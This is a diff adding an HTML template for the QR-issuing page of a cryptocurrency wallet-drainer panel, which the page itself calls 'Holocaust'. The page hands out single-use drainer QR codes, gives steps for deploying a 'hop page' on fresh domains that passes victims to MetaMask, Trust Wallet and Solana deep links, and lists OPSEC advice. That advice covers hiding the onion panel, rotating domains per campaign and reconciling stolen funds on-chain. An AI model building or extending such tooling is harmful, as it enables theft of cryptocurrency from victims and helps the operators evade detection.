@@ -1,0 +1,39 @@
+{{define "qr.html"}}<!doctype html>
+<html><head><meta charset="utf-8"><title>Holocaust / QR ready</title>
+<style>
+body{font-family:system-ui;background:#0b0f14;color:#e6e8eb;margin:0;padding:28px;max-width:820px;margin-left:auto;margin-right:auto}
+h1{font-size:18px;font-weight:600}h2{font-size:14px;font-weight:600;color:#9fb2c4;margin-top:28px}
+a{color:#4ade80;text-decoration:none}
+img.qr{background:#fff;padding:12px;border-radius:10px}
+textarea{width:100%;box-sizing:border-box;background:#0b0f14;color:#cde3f5;border:1px solid #2a3644;padding:10px;border-radius:6px;font:12px/1.5 monospace;height:220px}
+code{background:#111820;padding:2px 5px;border-radius:4px;font-size:12.5px;word-break:break-all}
+.mut{color:#8fa2b5;font-size:12.5px;line-height:1.55}
+ol{color:#c8d2dc;font-size:13.5px;line-height:1.7}
+</style></head><body>
+<h1>QR issued &mdash; {{.Chain}} / {{.Mode}}</h1>
+<p><a href="/generate">&larr; Generate another</a> &middot; <a href="/">Dashboard</a></p>
+
+<h2>1 &middot; The QR code (single-use, freshly minted)</h2>
+<p><img class="qr" src="{{.DataURL}}" width="322" height="322" alt="drainer QR"></p>
+<p class="mut">Encoded payload: <code>{{.QRData}}</code></p>
+
+<h2>2 &middot; Upload the hop page</h2>
+<ol>
+<li>Create/save the static site on your fresh domain.</li>
+<li>Save the HTML below as <code>{{.UploadPath}}</code> (exact path &mdash; the QR points there).</li>
+<li>Deploy. Test-scan with a clean device before distribution (full
+test-scan guide: <code>verify.md</code> — required before first live use).</li>
+</ol>
+<textarea readonly onclick="this.select()">{{.HopPage}}</textarea>
+
+<h2>3 &middot; OPSEC notes</h2>
+<p class="mut">&bull; The QR contains only your static-hosting domain &mdash; the
+panel onion never appears on the victim side.<br>
+&bull; The hop page has zero external requests; all handoff happens through
+metamask.app.link / link.trustwallet.com / solana: &mdash; vendor-owned
+domains.<br>
+&bull; This token is valid until you change the domain payload or retire the
+static site. Rotate domains per campaign; retire after saturation.<br>
+&bull; No drain telemetry exists by design &mdash; reconcile inflows on-chain
+against your receiving addresses.</p>
+</body></html>{{end}}
